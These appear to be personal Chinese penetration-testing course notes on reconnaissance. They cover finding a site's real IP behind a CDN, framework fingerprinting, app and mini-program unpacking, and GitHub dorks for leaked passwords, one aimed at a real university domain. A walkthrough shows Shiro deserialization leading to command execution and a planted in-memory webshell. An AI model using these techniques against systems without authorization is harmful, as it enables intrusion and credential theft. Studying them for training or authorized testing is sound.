![image-20250710113743801](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084232058-718730393.png)

这个显示的详细一点，有版本

可以看到开放的端口有哪些，如果不加扫描全部端口那么只会扫描一些常见的端口

进阶命令参考文章：[【端口扫描工具】nmap核心使用方法_使用nmap进行端口扫描,查看端口开放情况,是否默认关闭telnet和 ssh 服务端口-CSDN博客](https://blog.csdn.net/qq_53079406/article/details/125263917)

### masscan

基本命令：

```
masscan -p端口号 目标ip
```

![image-20250710111151388](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084232438-1811483897.png)



扫描多个

![image-20250710111656445](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084232706-1827392544.png)

扫描全部的

```
masscan -p1-65535 目标ip
```

![image-20250710123609748](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084232995-1736770157.png)



### 网络空间

fofa直接搜ip

![image-20250710114402830](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084233285-1444863603.png)

查看ip聚合

![image-20250710114418231](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084233592-1890124661.png)

可以看到开放的端口

![image-20250710114441442](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084233874-972739961.png)

![image-20250710114555934](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084234179-558105081.png)

## Waf

### wafw00f

命令：

```
python main.py https://jmhewang.com/
```

![image-20250710135924415](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084234445-1932078640.png)

安全狗

### 网络空间

这个也能判断

![image-20250710141650494](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084234731-1153732819.png)

## 蜜罐

### Hfish蜜罐

![image-20250710191302267](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084235038-1652424361.png)





### Heimdallr

用来检查是否为蜜罐，插件，地址：https://github.com/Ghr07h/Heimdallr







但也不完全准确，可能会有误报

### 判断

web访问协议就下载，端口多且有规律性

| 特征类型   | 示例行为                              |
| ---------- | ------------------------------------- |
| 易被入侵   | 弱口令、端口开放过多、未授权访问      |
| 无真实感   | 目录结构不完整、命令无实际效果        |
| 出站隔离   | ping 不出去、curl 无法下载            |
| 响应异常   | 执行命令太快，输出格式怪异            |
| 系统不合理 | uptime 很短、系统信息被屏蔽           |
| 工具指纹   | `cowrie`, `hfish`, `kippo` 等进程存在 |

<br/>

# 第16天：信息打点-CDN绕过&业务部署&漏洞回链&接口探针&全网扫描&反向邮件

```
1、CDN 服务-解释差异识别 
2、CDN 绕过-配置差异导致 
3、CDN 绕过-主动连接获取 
4、CDN 绕过-全网扫描获取 
解决： 
1、CDN 服务对安全影响 
2、CDN 服务绕过识别手法
```

#前置知识：  

1.传统访问：用户访问域名–>解析服务器 IP–>访问目标主机  

2.普通 CDN：用户访问域名–>CDN 节点–>真实服务器 IP–>访问目标主机  

3.带 WAF 的 CDN：用户访问域名–>CDN 节点（WAF）–>真实服务器 IP–>访问目标主机   



国内服务商：  

阿里云 百度云 七牛云  

又拍云 腾讯云 Ucloud  

360 网宿科技 ChinaCache   



国外服务商：

CloudFlare StackPath Fastly  

Akamai CloudFront Edgecast  

CDNetworks Google Cloud CDN  

CacheFly Keycdn Udomain CDN77   



 #CDN 配置：  

配置 1：加速域名-需要启用加速的域名  

子域名获取真实ip 子域名和域名有可能在同一ip或者网段

例：

www.xiaodi8.com 加速 那么访问这个就会受影响

bbs.xiaodi8.com 不加速 不受影响

如果设置成*.xiaodi8.com 那么这个ip就失效

配置 2：加速区域-需要启用加速的地区  

三种：中国内地、全球、全球（除中国内地）

看哪些地区没有加速，那么就可以找到真实ip

配置 3：加速类型-需要启用加速的资源   



#参考知识：  

超级 Ping：http://www.17ce.com/  

超级 Ping：https://ping.chinaz.com/  

接口查询：https://get-site-ip.com/  

接口查询：https://fofa.info/extensions/source  

国外请求：https://tools.ipip.net/cdn.php  

国外请求：https://boce.aliyun.com/detect/  

IP 社区库：https://www.cz88.net/geo-public  

全网扫描：https://github.com/Tai7sy/fuckcdn  

全网扫描：https://github.com/boy-hack/w8fuckcdn  

全网扫描：https://github.com/Pluto-123/Bypass_cdn   



https://mp.weixin.qq.com/s/zxEH-HMqKukmq7qXfrdnQQ  

常见方法：  

子域名，邮件系统，国外访问，证书查询，APP 抓包，网络空间  

通过漏洞或泄露获取，扫全网，以量打量，第三方接口查询等   

## 超级ping

网址：http://www.17ce.com/  

输入要查询的网站：

![image-20250712123904008](D:\cyberspace\笔记\图片\image-20250712123904008.png)

这个会在各地去解析ip，我们发现这个都是一样的，所以真实ip就是这个，判断出没有使用CDN

另外一个：https://ping.chinaz.com/  

![image-20250712124219470](D:\cyberspace\笔记\图片\image-20250712124219470.png)

也是一样的

我们查询其他的

![image-20250712124703621](D:\cyberspace\笔记\图片\image-20250712124703621.png)

会发现不同的地区会有不一样的解析ip，解析ip所在地也不一样，那么可以判断这个使用了CDN加速

### 子域名查询

当子域名和域名访问的时候都是同一个

比如当访问www.abc.com和访问abc.com时是同一个，但是www.abc.com是做了CDN加速的，这个时候可以尝试看看abc.com有没有做加速

## hosts文件绑定

主要用于将主机名映射到 IP 地址。当用户在浏览器中输入一个网址时，系统会首先从 Hosts 文件中寻找对应的 IP 地址，如果找到则直接访问该地址，否则会提交给 DNS 服务器进行解析

文件目录是C:\Windows\System32\drivers\etc\hosts

在文件后面加上`ip 域名`就好了

## 利用ssrf漏洞

利用它来主动访问我们会给出真实ip，也就是服务器主动来找我们

构造一个监听服务地址，让服务器访问之后，就可以收到来自服务器的真实ip

## 利用phpinfo

看phpinfo的配置信息去找ip，但是如果服务器有内网，那么一般就只会显示内网ip，如果没有，那么就是真实ip

## 利用邮件系统

### 服务器->你

也是主动来找自己去找ip，我们利用服务器发给我们的邮件，查看邮件原文来找真实ip

![image-20250712132529251](D:\cyberspace\笔记\图片\image-20250712132529251.png)

但是要注意看发件人![image-20250712132643836](D:\cyberspace\笔记\图片\image-20250712132643836.png)

这个是域名发过来的，如果不是的话那么去看邮件原文是找不到真实ip的

### 你->服务器

这个需要自己的邮件服务器不是第三方，通过发送不存在的邮箱地址，然后发送失败会受到服务期返回的失败的邮件，然后得到真实ip

## 网站一键查询

不一定正确，需要综合考虑，只做参考

https://get-site-ip.com/ 

![image-20250712134913815](D:\cyberspace\笔记\图片\image-20250712134913815.png)

和ping的一样

![image-20250712134931785](D:\cyberspace\笔记\图片\image-20250712134931785.png)

## 备案

每个网站下面都有备案，可以根据这个来综合判断

比如说这个是渝，就是重庆市

![image-20250712135516917](D:\cyberspace\笔记\图片\image-20250712135516917.png)

## 全网扫描

### 判断加速厂商

厂商查询：https://tools.ipip.net/cdn.php

输入网址查询是什么厂商，比如阿里云、腾讯云等等

### IP库筛选地址段

https://www.cz88.net/geo-public

### 配置范围扫描

https://github.com/Tai7sy/fuckcdn

fuckcdn使用说明：

```
set.ini是配置文件

#set.ini是配置文件
ScanType=tcp    #使用tcp扫描方式  若 支持syn扫描(2003机器)  可设置为 syn
ScanPort=80,8080    #扫描开放端口  (初步扫描)  支持多端口  但是验证时只取第一个, //TODO 待完善
WorkThread=5    #主要工作进程数目(IP扫描后, 同时进行几个ip结果文件的二次扫描)
FuckThread=100  #二次扫描验证线程数
FindUrl=http://example.com/ #扫描的网址
FindStr=NiNJA,52ML,kangml,sbwml #初步扫描后 进行二次判断  判断结果是否包含此关键字, 逗号分割, 逻辑或

其余配置忽略!!!!
```

![image-20250712144626988](D:\cyberspace\笔记\图片\image-20250712144626988.png)

输入：

```
ip:端口
```

<br/>

# 第17天：信息打点-语言框架&开发组件&FastJson&Shiro&Log4j&SpringBoot等

```
1、CMS 指纹识别-不出网程序识别 
2、开发框架识别-PHP&Python&Java 
3、开发组件识别-Java 常见安全漏洞组件 

后端： 
CMS：一般 PHP 开发居多源码程序 
（利用源码程序名去搜漏洞情况，源码去下载进行后期的代码审计） 
前端 
js 框架（爬取更多的 js 从里面筛选 URL 或敏感泄漏 key 等） 
也是可以通过对 js 代码逻辑进行代码审计 
 
组件：java 居多， 
常见有过安全漏洞组件（shiro solr log4j sprintboot 等） 

框架：php java python 都有 
 
框架：简单代码的一个整合库，如果使用框架就只需要学习使用框架调用即可 
如：文件上传功能是需要很多代码来实现的，框架把这个代码进行封封装，调用即可 影响：如果采用框架开发，代码的安全性是取决于框架的过滤机制 
 
组件：第三方的功能模块（日志记录，数据监控，数据转换等） 
 
Web 架构： 
1、最简单最入门的开发模型（功能代码全部手写） 
最容易出现漏洞，程序员水平不一，没有第三方或团队的检测，单纯的自己写 
 
2、结合开发框架的开发模型（以框架为核心实现功能） 
第三方或团队的开发的封装代码框架，一般内置的过滤机制（框架漏洞） 
 
3、结合开发框架外加组件模型（以框架为核心，组件为辅实现功能） 
第三方或团队的开发的封装代码框架，一般内置的过滤机制（框架和组件漏洞） 
 
指纹识别-本地工具-GotoScan（CMSEEK） 
1、在线平台见前面课程，本地工具适用于不出网环境 
https://github.com/newbe3three/gotoscan 
2、网络空间：Fofa Quake Hunter 
3、网络空间：IO 图标关系 

#Python-开发框架-Django&Flask
Django
1、识别插件
2、Set-Cookie:expires=

Flask
1、识别插件
2、Set-Cookie:expires=


#PHP-开发框架-ThinkPHP&Laravel&Yii
ThinkPHP:
0、识别插件
1、X-Powered-By:ThinkPHP
2、CMS识别到源码体系TP开发

Laravel:
1、识别插件
2、Set-Cookie中特征的格式

Yii:
1、识别插件
2、set-Cookie中特征的格式

#Java-框架组件-Fastjson&Shiro&Solr&Spring
52类110个主流Java组件和框架介绍:
https://blog.csdn.net/agonie201218/article/details/125300729

Fastison/Jackson
在提交JSON数据包中修改测试:
-Fastison组件会把01解析成1
-Jackson组件在解析01时会抛出异常
https://forum.butian.net/share/1679
https://www.iculture.cc/forum-post/24115.html

Shiro
请求包的cookie中存在rememberMe字段。
返回包中存在set-Cookie:remeberMe=deleteMe。
请求包中存在rememberMe=x时，响应包中存在rememberMe=deleteMe。
有时候服务器不会主动返回remeberMe=deleteMe，直接发包即可，将Cookie内容改为remember Me=1，若相应包有rememberMe=deleteMe，则基本可以确定网站apacheshiro搭建的。

Struts2
一般使用struts2框架后缀带do或action可以尝试进行利用

Springboot
1、通过web应用程序网页标签的小绿叶图标
2、通过springboot框架默认报错页面

Solr识别
一般开放8983端口,访问页面也可以探针到
```



## gotoscan

识别cms

命令：

```
gotoscan.exe -host 目标url
```

![image-20250714122611449](D:\cyberspace\笔记\图片\image-20250714122611449.png)

cms识别成功

## 框架识别

多种方法，当一种不行时用另外的，综合判断

### Django

#### 插件查看

![image-20250714170339873](D:\cyberspace\笔记\图片\image-20250714170339873.png)

#### 关键特征

Set-Cookie:expires=

![image-20250714170411567](D:\cyberspace\笔记\图片\image-20250714170411567-1752483851823-1.png)

### Flask

#### 插件查看

![image-20250714175651923](D:\cyberspace\笔记\图片\image-20250714175651923.png)

#### 特征

![image-20250714175625678](D:\cyberspace\笔记\图片\image-20250714175625678.png)

### ThinkPHP

#### 插件识别

![image-20250714180203858](D:\cyberspace\笔记\图片\image-20250714180203858.png)

#### 特征

![image-20250714180221472](D:\cyberspace\笔记\图片\image-20250714180221472.png)

#### 图标

![image-20250714180424152](D:\cyberspace\笔记\图片\image-20250714180424152.png)

#### 源码查询

![image-20250714180827766](D:\cyberspace\笔记\图片\image-20250714180827766.png)

![image-20250714180836283](D:\cyberspace\笔记\图片\image-20250714180836283.png)

内核还是以thinphp写的框架

### Laravel

#### 插件

![image-20250714185651685](D:\cyberspace\笔记\图片\image-20250714185651685.png)

#### 特征

![image-20250714185716907](D:\cyberspace\笔记\图片\image-20250714185716907.png)

### Yii

#### 插件

![image-20250714185850713](D:\cyberspace\笔记\图片\image-20250714185850713.png)

#### 特征

![image-20250714185914762](D:\cyberspace\笔记\图片\image-20250714185914762.png)

### Fastison/Jackson

在提交JSON数据包中修改测试:
-Fastison组件会把01解析成1
-Jackson组件在解析01时会抛出异常
https://forum.butian.net/share/1679
https://www.iculture.cc/forum-post/24115.html



### Shiro

请求包的cookie中存在rememberMe字段。
返回包中存在set-Cookie:remeberMe=deleteMe。
请求包中存在rememberMe=x时，响应包中存在rememberMe=deleteMe。
有时候服务器不会主动返回remeberMe=deleteMe，直接发包即可，将Cookie内容改为remember Me=1，若相应包有rememberMe=deleteMe，则基本可以确定网站apacheshiro搭建的。

请求包有rememberMe字段

![image-20250714191631999](D:\cyberspace\笔记\图片\image-20250714191631999.png)

![image-20250714192314674](D:\cyberspace\笔记\图片\image-20250714192314674.png)



### Struts2

一般使用struts2框架后缀带do或action可以尝试进行利用

![image-20250714192417652](D:\cyberspace\笔记\图片\image-20250714192417652.png)

![image-20250714192450026](D:\cyberspace\笔记\图片\image-20250714192450026.png)

![image-20250714192456510](D:\cyberspace\笔记\图片\image-20250714192456510.png)

### Springboot

#### 页面

![image-20250714192833099](D:\cyberspace\笔记\图片\image-20250714192833099.png)

#### 图标

![image-20250714192909498](D:\cyberspace\笔记\图片\image-20250714192909498.png)

### Solr识别

一般开放8983端口,访问页面也可以探针到

![image-20250714193945648](D:\cyberspace\笔记\图片\image-20250714193945648.png)

![image-20250714193958281](D:\cyberspace\笔记\图片\image-20250714193958281.png)

## shiro反序列化

开启环境

![image-20250714195600799](D:\cyberspace\笔记\图片\image-20250714195600799.png)

用给的用户名和密码登录，一定要点remember Me

登录查看包

![image-20250714195650743](D:\cyberspace\笔记\图片\image-20250714195650743.png)

发现有rememberMe，打开漏洞利用工具，检测当前密钥

![image-20250714195817470](D:\cyberspace\笔记\图片\image-20250714195817470.png)

爆破密钥

![image-20250714195840201](D:\cyberspace\笔记\图片\image-20250714195840201.png)

检测当前利用链

![image-20250714195948966](D:\cyberspace\笔记\图片\image-20250714195948966.png)

爆破利用链及回显

![image-20250714200033375](D:\cyberspace\笔记\图片\image-20250714200033375.png)

命令执行

![image-20250714200125041](D:\cyberspace\笔记\图片\image-20250714200125041.png)

发现成功了, 内存马植入

![image-20250714200213473](D:\cyberspace\笔记\图片\image-20250714200213473.png)

用webshell工具哥斯拉连接

![image-20250714200429798](D:\cyberspace\笔记\图片\image-20250714200429798.png)

![image-20250714200500315](D:\cyberspace\笔记\图片\image-20250714200500315.png)

<br/>

# 第18天：信息打点-APP资产&知识产权&应用监控&静态提取&动态抓包&动态调试

```
1、web&备案信息&单位名称中发现APP
2、APP资产静态提取&动态抓包&动态调试
解决:
1、如何获取到目标APP信息
2、如何从APP信息中提取资产

案例1：名称获取APP信息（爱企查/小蓝本/七麦/点点）
1、爱企查知识产权 
2、七麦&点点查名称 
https://www.xiaolanben.com/ 
https://aiqicha.baidu.com/ 
https://www.qimai.cn/ 
https://app.diandian.com/ 

案例2：URL网站备案查APP 
1、查备案信息在搜 
2、网站上有APP下载 
3、市场直接搜单位名称 

通过获取App配置、数据包，去获取url、api、osskey、js等敏感信息。
1、资产信息-IP 域名 网站 -转到对应Web测试 接口测试 服务测试  
2、泄露信息-配置key 资源文件 - key（osskey利用，邮件配置等）
3、代码信息-java代码安全问题- 逆向相关 

APP中收集资产 
1、抓包-动态表现 
2、提取-静态表现&动态调试 
3、搜索-静态表现 

1、抓包抓表现出来的数据 
优点：没有误报 
缺点：无法做到完整 

2、反编译从源码中提取数据 
优点：数据较为完整 
缺点：有很多无用的资产 

3、动态调试从表现中提取数据 
优点：没有误报，解决不能抓包不能代理等情况 
优点；搞逆向的人能看到实时的app调用链等 
缺点：无法做到完整 

案例：某APP打开无数据包，登录有数据包（反编译后未找到目标资产，抓包住到了）
原因：那个登录界面是APP打包的资源，并没有对外发送数据 

案例3：APP提取信息-静态分析 
1、MobSF 
2、AppInfoScanner 
3、两个在线平台
https://mogua.co/
https://www.zhihuaspace.cn:8888/
https://github.com/kelvinBen/AppInfoScanner
https://github.com/MobSF/Mobile-Security-Framework-MobSF
https://blog.csdn.net/ljh824144294/article/details/119181803

案例3:APP提取信息-动态抓包
-前期部分抓包技术

案例3:APP提取信息-动态调试
-MobSF+模拟器
```

## 案例1：名称获取APP信息（爱企查/小蓝本/七麦/点点）

### 1、小蓝本

![image-20250716105459136](D:\cyberspace\笔记\图片\image-20250716105459136.png)

### 2、七麦&点点查名称 

![image-20250716105549992](D:\cyberspace\笔记\图片\image-20250716105549992.png)

![image-20250716105603085](D:\cyberspace\笔记\图片\image-20250716105603085.png)

https://www.xiaolanben.com/

 https://aiqicha.baidu.com/ 

https://www.qimai.cn/ 

https://app.diandian.com/ 

## 案例2：URL网站备案查APP 

### 1、查备案信息在搜 

![2](D:\cyberspace\笔记\图片\image-20250716110357802.png)

![image-20250716110429526](D:\cyberspace\笔记\图片\image-20250716110429526.png)

![image-20250716110511106](D:\cyberspace\笔记\图片\image-20250716110511106.png)

### 2、网站上有APP下载 

![image-20250716105633118](D:\cyberspace\笔记\图片\image-20250716105633118.png)

### 3、市场直接搜单位名称 

通过获取App配置、数据包，去获取url、api、osskey、js等敏感信息。

1、资产信息-IP 域名 网站 -转到对应Web测试 接口测试 服务测试  

2、泄露信息-配置key 资源文件 - key（osskey利用，邮件配置等）

3、代码信息-java代码安全问题- 逆向相关 

![image-20250716112608974](D:\cyberspace\笔记\图片\image-20250716112608974.png)

[摸瓜-查诈骗APP_查病毒APP_免费APK反编译分析工具](https://mogua.co/)

### APP中收集资产 

1、抓包-动态表现 

2、提取-静态表现&动态调试 

3、搜索-静态表现 

#### 1、抓包抓表现出来的数据 

优点：没有误报 

缺点：无法做到完整 



#### 2、反编译从源码中提取数据 

优点：数据较为完整 

缺点：有很多无用的资产 



#### 3、动态调试从表现中提取数据 

优点：没有误报，解决不能抓包不能代理等情况 优点；搞逆向的人能看到实时的app调用链等 缺点：无法做到完整 



案例：某APP打开无数据包，登录有数据包（反编译后未找到目标资产，抓包住到了）

原因：那个登录界面是APP打包的资源，并没有对外发送数据



## 案例3：APP提取信息-静态分析 

### AppInfoScanner

静态分析，如果是动态的就提不出来

地址：[https://github.com/kelvinBen/AppInfoScanner](https://github.com/kelvinBen/AppInfoScanner)

命令：

```
python3 app.py android -i <Your apk file>  
```



### MobSF

动态调试，可以测试到抓包抓不到的东西

xiaodi8测试

启动：

```
run.bat 0.0.0.0:8000
```

访问：

```
http://localhost:8000/
```

在界面可以直接分析我们已经在模拟器安装好的app

![image-20250717173551563](D:\cyberspace\笔记\图片\image-20250717173551563.png)

<br/>

# 第19天：信息打点-小程序应用&解包反编译&动态调试&抓包&静态分析&源码架构

```
#小程序获取-各大平台&关键字搜索 -微信 
-百度 
-支付宝 
-抖音头条 

#小程序体验-凡科建站&模版测试上线 
测试：https://qz.fkw.com/ 
参考：https://blog.csdn.net/qq_52445443/article/details/122351865 

1.主体结构 
小程序包含一个描述整体程序的 app 和多个描述各自页面的 page。 
一个小程序主体部分(即app)由三个文件组成，必须放在项目的根目录，如下： 
    文件                 必需               作用     
    app.js               是            小程序逻辑 
    app.json             是            小程序公共配置 
    app.wxss             否            小程序公共样式表 
2.一个小程序页面由四个文件组成，分别是:      
    xxx.js        页面逻辑 
   xxx.json      页面配置 
    xxx.wxml      页面结构 
    xxx.wxss      页面样式 
3.项目整体目录结构 
    pages                页面文件夹 
    index                首页 
    logs                 日志 
    utils                
    util                 工具类(mina框架自动生成,你也可以建立一个：api) 
    app.js               入口js(类似于java类中的main方法)、全局js     app.json             全局配置文件 
    app.wxss             全局样式文件 
    project.config.json  跟你在详情中勾选的配置一样 
    sitemap.json         用来配置小程序及其页面是否允许被微信索引 
#小程序抓包-Proxifier&BurpSuite联动 -对抓到的IP或域名进行Web安全测试 
-对抓到的IP或域名进行API安全测试 
-对抓到的IP或域名进行端口服务测试 
-对抓到的IP或域名进行端口服务测试

#小程序逆向-解包反编译&动态调试&架构
对源码架构进行分析
-更多的资产信息
-敏感的配置信息
-未授权访问测试
-源码中的安全问题


```

## Proxifier&BurpSuite联动

![image-20250718170644324](D:\cyberspace\笔记\图片\image-20250718170644324.png)

![image-20250718170926238](D:\cyberspace\笔记\图片\image-20250718170926238.png)



抓小程序



## 解包反编译



微信小程序文件所在目录在微信文件夹上一级的Applet里面

![image-20250726091245594](D:\cyberspace\笔记\图片\image-20250726091245594.png)

解密小程序包，工具UnpackMiniApp

![image-20250726095859790](D:\cyberspace\笔记\图片\image-20250726095859790.png)

解密成功

![image-20250726095914904](D:\cyberspace\笔记\图片\image-20250726095914904.png)

![image-20250726091400589](D:\cyberspace\笔记\图片\image-20250726091400589.png)

开始逆向，工具wxappUnpacker，命令行操作

```
bingo.bat D:\cyberspace\web_tools\InformationGatheringTools\UnpackMiniApp\wxpack\wx687b1b524d23f77c.wxapkg
```

![image-20250726101118440](D:\cyberspace\笔记\图片\image-20250726101118440.png)

生成的文件在wxapkg同一个目录下面

![image-20250726101209931](D:\cyberspace\笔记\图片\image-20250726101209931.png)

![image-20250726101219196](D:\cyberspace\笔记\图片\image-20250726101219196.png)

打开微信开发者工具，左上角导入项目

![image-20250726101358916](D:\cyberspace\笔记\图片\image-20250726101358916.png)

差不多是这样

![image-20250726101610275](D:\cyberspace\笔记\图片\image-20250726101610275.png)

在遇到一个小程序有多个wxapkg包的时候，需要每个包都解密，并且需要在解密完一个包之后对那个包进行改名，不然再去解密第二个包的时候会覆盖第一个

![image-20250726103324558](D:\cyberspace\笔记\图片\image-20250726103324558.png)

逆向









工具解包再反编译，拿到微信开发者工具打开





## 抓包和反编译对比













# 第20天：信息打点-红蓝队自动化项目&资产侦察&企查产权&武器库部署&网络空间

```
#各类红蓝队优秀工具项目集合： 
https://github.com/guchangan1/All-Defense-Tool 
本项目集成了全网优秀的开源攻防武器项目，包含信息收集工具（自动化利用工具、资产发现工具、目录扫描工具、子域名收集工具、指纹识别工具、端口扫描工具、各种插
件...），漏洞利用工具（各大CMS利用工具、中间件利用工具等项目...），内网渗透工具（隧道代理、密码提取...）、应急响应工具、甲方运维工具、等其他安全攻防资料整理，供攻防双方使用。如果你有更好的建议，欢迎提出请求。

#自动化-武器库部署-F8x 
项目地址：https://github.com/ffffffff0x/f8x 
1、介绍：
一款红/蓝队环境自动化部署工具,支持多种场景,渗透,开发,代理环境,服务可选项等. 
2、配置：
通过 CF Workers 下载 [推荐] 
wget : wget -O f8x https://f8x.io/ 
curl : curl -o f8x https://f8x.io/ 
3、使用：见项目文档 

#自动化-网络空间-AsamF 
项目地址：https://github.com/Kento-Sec/AsamF 
1、介绍： 
AsamF集成了Fofa、Hunter、Quake、Zoomeye、Shodan、爱企查、Chinaz、0.zone、subfinder。AsamF支持Fofa、Hunter、Quake、Zoomeye、Shodan、Chinaz、0.zone配置多个Key。 
2、配置： 
AsamF会在~/.config/asamf/目录下生成config.json文件。 
如果你有多个key，按照json的格式录入即可，建议键值按照阿拉伯数字依次录入,方便以阿拉伯数字来切换key。自动结果保存在~/asamf/目录下。
3、使用：见项目文档 

#自动化-企查信息-ENScan 
项目地址：https://github.com/wgpsec/ENScan_GO 
1、介绍：
剑指HW/SRC，解决在HW/SRC场景下遇到的各种针对国内企业信息收集难题 2、配置：
ENScanGo在第一次使用时需要使用-v命令生成配置文件信息后进行配置 
3、使用：见项目文档 

#自动化-综合架构-ARL&Nemo
-ARL灯塔
项目地址:https://github.com/TophantTechnology/ARL
1、介绍:
旨在快速侦察与目标关联的互联网资产，构建基础资产信息库。协助甲方安全团队或者渗透测试人员有效侦察和检索资产，发现存在的薄弱点和攻击面
2、配置:(docker搭建)
git clone https://qithub.com/TophantTechnology/ARI
cd ARL/docker/
docker volume create arl db
docker-compose pul1
docker-compose up-d
3、使用:见直播操作

-Nemo Go
项目地址:https://github.com/hanc00l/nemo_go
1、介绍:
Nemo是用来进行自动化信息收集的一个简单平台，通过集成常用的信息收集工具和技术实现对内网及互联网资产信息的自动收集，提高隐患排查和渗透测试的工作效率，用Golang完全重构了原Python版本
2、配置:(docker搭建)
https://github.com/hanc00l/nemo_go/blob/main/docs/docker.md
下载release的nemo_linux_amd64.tar后执行:
mkdir nemo;tar xvf nemo_linux_amd64.tar -C nemo;cd nemo
docker-compose up -d
3、使用:见直播操作
Bug:网络空间(配置后要重启)4、
https://github.com/hanc00l/nemo_go/issues/72
```



## 自动化-网络空间-AsamF

集成工具，解决导出问题



## 自动化-企查信息-ENScan

也是解决导出问题







## ARL灯塔

挺多教程的，其实我在最开始搞的时候因为docker问题出错搞到一半就没有搞了结果访问Nemo的时候打错端口误打误撞进去了，端口5003

启动和关闭：

```
docker-compose up -d
docker-compose down
```

默认账号和密码：admin:arlpass

测试一个小迪的网站试试

![image-20250731174021756](D:\cyberspace\笔记\图片\image-20250731174021756.png)

好了

![image-20250731174219253](D:\cyberspace\笔记\图片\image-20250731174219253.png)

![image-20250731174238881](D:\cyberspace\笔记\图片\image-20250731174238881.png)

![image-20250731174314533](D:\cyberspace\笔记\图片\image-20250731174314533.png)

再去补天找一个试试







## Nemo Go

github下载

两条命令解决

```
mkdir nemo;tar xvf nemo_linux_amd64.tar -C nemo;cd nemo
docker-compose up -d
```

启动和关闭：

```
docker-compose up -d
docker-compose down
```

访问（端口我这里自己改了

```
https://ip:5050
```

![image-20250731170819282](D:\cyberspace\笔记\图片\image-20250731170819282.png)

默认的账号密码就是nemo:nemo

![image-20250731170913149](D:\cyberspace\笔记\图片\image-20250731170913149.png)

在配置woker里面可以设置token

![image-20250731171130734](D:\cyberspace\笔记\图片\image-20250731171130734.png)





## F8x

地址：[ffffffff0x/f8x: 红/蓝队环境自动化部署工具 | Red/Blue team environment automation deployment tool](https://github.com/ffffffff0x/f8x)

运行：

```
bash f8x -h
```

一键化部署，想搭建什么就搭建什么

安装在/pentest目录下面

<br/>

# 第21天：信息打点-公众号服务&Github监控&供应链&网盘泄漏&证书图标邮箱资产

```
#微信公众号-获取&三方服务 
1、获取微信公众号途径
https://weixin.sogou.com/ 
2、微信公众号有无第三方服务 

#Github监控-开发&配置&源码 
    目标中开发人员或者托管公司上传的项目存在源码泄漏或配置信息（密码密匙等），人员数据库等敏感信息，找到多个脆弱点。
1、人员&域名&邮箱等筛选 
eg：xxx.cn password in:file 
https://gitee.com/ 
https://github.com/ 
https://www.huzhan.com/ 
GITHUB资源搜索： 
in:name test               #仓库标题搜索含有关键字  
in:descripton test         #仓库描述搜索含有关键字  
in:readme test             #Readme文件搜素含有关键字  
stars:>3000 test           #stars数量大于3000的搜索关键字  
stars:1000..3000 test      #stars数量大于1000小于3000的搜索关键字 
forks:>1000 test           #forks数量大于1000的搜索关键字  
forks:1000..3000 test      #forks数量大于1000小于3000的搜索关键字 
size:>=5000 test           #指定仓库大于5000k(5M)的搜索关键字 
pushed:>2019-02-12 test    #发布时间大于2019-02-12的搜索关键字 
created:>2019-02-12 test   #创建时间大于2019-02-12的搜索关键字 
user:test                  #用户名搜素  
license:apache-2.0 test    #明确仓库的 LICENSE 搜索关键字 
language:java test         #在java语言的代码中搜索关键字  
user:test in:name test     #组合搜索,用户名test的标题含有test的 
关键字配合谷歌搜索：
site:Github.com smtp    
site:Github.com smtp @qq.com    
site:Github.com smtp @126.com    
site:Github.com smtp @163.com    
site:Github.com smtp @sina.com.cn  
site:Github.com smtp password  
site:Github.com String password smtp 

2、语法固定长期后续监控新泄露 
-基于关键字监控 
-基于项目规则监控
https://github.com/madneal/gshark
https://github.com/NHPT/FireEyeGoldCrystal
https://github.com/Explorer1092/Github-Monitor

#网盘资源搜索-全局文件机密
主要就是查看网盘中是否存有目标的敏感文件
如:企业招标，人员信息，业务产品，应用源码等

#敏感目录文件-目录扫描&爬虫
-后续会详细讲到各类工具项目

#网络空间进阶-证书&图标&邮箱
-证书资产
fofa quake hunter
-ICO资产
fofa quake hunter
-邮箱资产
https://hunter.io/
```

## #微信公众号-获取&三方服务 

### 查企业看知识产权

![image-20250804120643787](D:\cyberspace\笔记\图片\image-20250804120643787.png)

搜狗搜

https://weixin.sogou.com/ 

这个看小迪是可以搜公众号的不知道我现在为啥只能搜文章了，但是可以看一下文章的发布者，可能是对应公众号发布的

## #Github监控-开发&配置&源码

### 1、人员&域名&邮箱等筛选

域名搜索，后面加上password等关键词，可能会有一些账号密码或者代码的泄露

![image-20250805103232705](D:\cyberspace\笔记\图片\image-20250805103232705.png)

### 2、语法固定长期后续监控新泄露 

https://github.com/Explorer1092/Github-Monitor

![image-20250805110603503](D:\cyberspace\笔记\图片\image-20250805110603503.png)

```
hutb.edu.cn password in:file
```

in:file是指在文件中出现关键字







```
免杀
```







```
CVE-2024
```







https://github.com/NHPT/FireEyeGoldCrystal





https://github.com/madneal/gshark





## #网盘资源搜索-全局文件机密

用作尝试，实战中用的不多

模拟器里面的app搜索

![image-20250807093729533](D:\cyberspace\笔记\图片\image-20250807093729533.png)

混合盘搜索

![image-20250805114700025](D:\cyberspace\笔记\图片\image-20250805114700025.png)

很难得到什么有用的，精确匹配又基本搜不到东西

## #网络空间进阶-证书&图标&邮箱

### -证书资产

连接安全->证书

![image-20250805152027720](D:\cyberspace\笔记\图片\image-20250805152027720.png)

![image-20250805152040002](D:\cyberspace\笔记\图片\image-20250805152040002.png)

![image-20250805152056735](D:\cyberspace\笔记\图片\image-20250805152056735.png)

语法：

```
cert="hutb.edu.cn"
```

![image-20250805152252403](D:\cyberspace\笔记\图片\image-20250805152252403.png)

![image-20250805152338998](D:\cyberspace\笔记\图片\image-20250805152338998.png)

### ICO资产

到源码下载对应图标，一般就是icon文件

![image-20250805153151247](D:\cyberspace\笔记\图片\image-20250805153151247.png)

![image-20250805153223674](D:\cyberspace\笔记\图片\image-20250805153223674.png)

![image-20250805153245962](D:\cyberspace\笔记\图片\image-20250805153245962.png)

![image-20250805153257574](D:\cyberspace\笔记\图片\image-20250805153257574.png)

![image-20250805153349137](D:\cyberspace\笔记\图片\image-20250805153349137.png)

